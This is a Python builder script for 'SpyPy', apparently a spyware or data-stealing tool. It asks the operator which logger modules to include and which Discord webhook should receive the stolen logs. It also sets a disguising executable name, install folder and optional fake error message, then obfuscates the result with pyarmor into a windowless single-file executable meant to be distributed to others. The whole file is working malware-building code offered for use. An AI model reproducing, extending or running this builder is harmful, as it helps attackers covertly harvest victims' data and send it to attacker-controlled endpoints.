#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#
#                                                                   #
#  Please do not run this file directly. Instead, run spy-py.bat.   #
#        Running this file directy will result in an error.         #
#                                                                   #
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#

import os
import re
import requests
import subprocess
import shutil

ERROR_OCCURRED = False

def get_logger_files():
    return [
        file
        for file in os.listdir("src/loggers")
        if file.endswith(".py") and not file.startswith("__")
    ]

def select_loggers():
    loggers = get_logger_files()
    selected_loggers = []
    for logger in loggers:
        choice = input(f"[SPY-PY BUILDER] Include {logger[:-3]} logger? (yes/no): ").strip().lower()
        if choice == "yes":
            selected_loggers.append(logger)
    return selected_loggers

def assemble_source(selected_loggers):
    global ERROR_OCCURRED
    imports = set()
    utils_content = ""
    loggers_content = ""
    main_content = ""

    if not os.path.exists("spy-py-temp"):
        os.makedirs("spy-py-temp")

    try:
        with open("src/utils.py", "r", encoding="utf-8") as f:
            utils_lines = f.readlines()
            for line in utils_lines:
                if re.match(r"^\s*import\s", line) or re.match(r"^\s*from\s.*\simport\s", line):
                    imports.add(line.strip())
                else:
                    utils_content += line
    except UnicodeDecodeError as e:
        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/utils.py': {e}")
        ERROR_OCCURRED = True
        return

    for root, _, files in os.walk("src/loggers"):
        for file in files:
            if file in selected_loggers:
                try:
                    with open(os.path.join(root, file), "r", encoding="utf-8") as f:
                        logger_lines = f.readlines()
                        for line in logger_lines:
                            if re.match(r"^\s*import\s", line) or re.match(r"^\s*from\s.*\simport\s", line):
                                if not line.startswith("from utils"):
                                    imports.add(line.strip())
                            else:
                                loggers_content += line
                except UnicodeDecodeError as e:
                    print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in '{os.path.join(root, file)}': {e}")
                    ERROR_OCCURRED = True
                    continue

    try:
        with open("src/main.py", "r", encoding="utf-8") as f:
            main_lines = f.readlines()
            for line in main_lines:
                if re.match(r"^\s*import\s", line) or re.match(r"^\s*from\s.*\simport\s", line):
                    if not line.startswith("from loggers") and not line.startswith("from utils"):
                        imports.add(line.strip())
                else:
                    main_content += line
    except UnicodeDecodeError as e:
        print(f"[SPY-PY BUILDER] [INFO] UnicodeDecodeError in 'src/main.py': {e}")
        ERROR_OCCURRED = True
        return

    try:
        with open("spy-py-temp/assembled.py", "w", encoding="utf-8") as f:
            for imp in sorted(imports):
                f.write(imp + "\n")
            f.write(utils_content)
            f.write("\n")
            f.write(loggers_content)
            f.write("\n")
            f.write(main_content)
    except UnicodeEncodeError as e:
        print(f"[SPY-PY BUILDER] [INFO] UnicodeEncodeError when writing to 'spy-py-temp/assembled.py': {e}")
        ERROR_OCCURRED = True
        return

    print("[SPY-PY BUILDER] [INFO] Assembly completed successfully.")

def prepare_source():
    global ERROR_OCCURRED
    try:
        webhook_url = input("[SPY-PY BUILDER] Enter the URL of the Discord webhook: ").strip()
        while True:
            data = {
                "content": "```✅ SpyPy has been configured to send logs to this webhook.```",
                "username": "SpyPy",
            }
            response = requests.post(webhook_url, json=data)
            if response.status_code not in [200, 204]:
                print("[SPY-PY BUILDER] [ERROR] Failed to send test message to webhook. Please enter a valid URL.")
                webhook_url = input("[SPY-PY BUILDER] Enter the URL of the Discord webhook: ").strip()
            else:
                break

        exe_name = input("[SPY-PY BUILDER] Enter the desired name of the executable: ").strip()
        software_dir_name = input(f"[SPY-PY BUILDER] Specify the name of the directory where the software will be stored (DEFAULT: {exe_name}): ").strip()
        choice = input("[SPY-PY BUILDER] Would you like to display a custom error message? (yes/no): ").strip().lower()
        custom_error_message = ""
        if choice == "yes":
            custom_error_message = input("[SPY-PY BUILDER] Enter the custom error message: ").strip()

        with open("spy-py-temp/assembled.py", "r", encoding="utf-8") as f:
            content = f.readlines()

        modified_content = []
        for line in content:
            if line.startswith("WEBHOOK_URL = "):
                modified_content.append(f'WEBHOOK_URL = "{webhook_url}"\n')
            elif line.startswith("SOFTWARE_EXE_NAME = "):
                modified_content.append(f'SOFTWARE_EXE_NAME = "{exe_name}"\n')
            elif line.startswith("SOFTWARE_DIR_NAME = "):
                if software_dir_name:
                    modified_content.append(f'SOFTWARE_DIR_NAME = "{software_dir_name}"\n')
                else:
                    modified_content.append(f'SOFTWARE_DIR_NAME = "{exe_name}"\n')
            elif line.startswith("CUSTOM_ERROR_MESSAGE = "):
                if custom_error_message:
                    modified_content.append(f'CUSTOM_ERROR_MESSAGE = "{custom_error_message}"\n')
                else:
                    modified_content.append("CUSTOM_ERROR_MESSAGE = None\n")
            else:
                modified_content.append(line)

        with open("spy-py-temp/prepared.py", "w", encoding="utf-8") as f:
            f.writelines(modified_content)

        os.remove("spy-py-temp/assembled.py")
        print("[SPY-PY BUILDER] [INFO] Source preparation completed successfully.")
        return exe_name
    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while preparing the source: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
        ERROR_OCCURRED = True
        return

def pack_source(exe_name):
    global ERROR_OCCURRED
    try:
        os.rename("spy-py-temp/prepared.py", f"spy-py-temp/{exe_name}.py")
        print("[SPY-PY BUILDER] [INFO] Packaging executable...")
        venv_activate_command = "Spy-Py\\Scripts\\activate"
        
        
        commands = [
            f'{venv_activate_command} && pyarmor cfg pack:pyi_options=" -w"',
            f'{venv_activate_command} && pyarmor gen --pack onefile spy-py-temp/{exe_name}.py'
        ]

        for command in commands:
            subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while packaging the executable: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
        ERROR_OCCURRED = True
        return
    print("[SPY-PY BUILDER] [INFO] Packaging executable completed successfully.")

def cleanup(exe_name):
    global ERROR_OCCURRED
    try:
        shutil.rmtree("spy-py-temp", ignore_errors=True)
        if os.path.exists(".pyarmor"):
            shutil.rmtree(".pyarmor", ignore_errors=True)
        if os.path.exists("Spy-Py"):
            shutil.rmtree("Spy-Py", ignore_errors=True)
        if os.path.exists(f"{exe_name}.spec"):
            os.remove(f"{exe_name}.spec")
    except Exception as e:
        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while cleaning up: {e}")
        print("[SPY-PY BUILDER] [ERROR] Please manually remove the 'spy-py-temp' directory.")
        ERROR_OCCURRED = True
    print("[SPY-PY BUILDER] [INFO] Cleanup completed successfully.")

def finish():
    if not ERROR_OCCURRED:
        print("[SPY-PY BUILDER] [INFO] The build process has been completed successfully. The executable is located in the 'dist' directory.")
        print("[SPY-PY BUILDER] [INFO] You can now run the executable or distribute it to others.")
    else:
        print("[SPY-PY BUILDER] [INFO] The build process has been completed with some errors.")
        print("[SPY-PY BUILDER] [INFO] Please check the errors and try again.")

def main():
    print("[SPY-PY BUILDER] Welcome to the SpyPy Builder!")
    selected_loggers = select_loggers()
    assemble_source(selected_loggers)
    if not ERROR_OCCURRED:
        exe_name = prepare_source()
        if not ERROR_OCCURRED:
            pack_source(exe_name)
            if not ERROR_OCCURRED:
                cleanup(exe_name)
                finish()

if __name__ == "__main__":
    main()
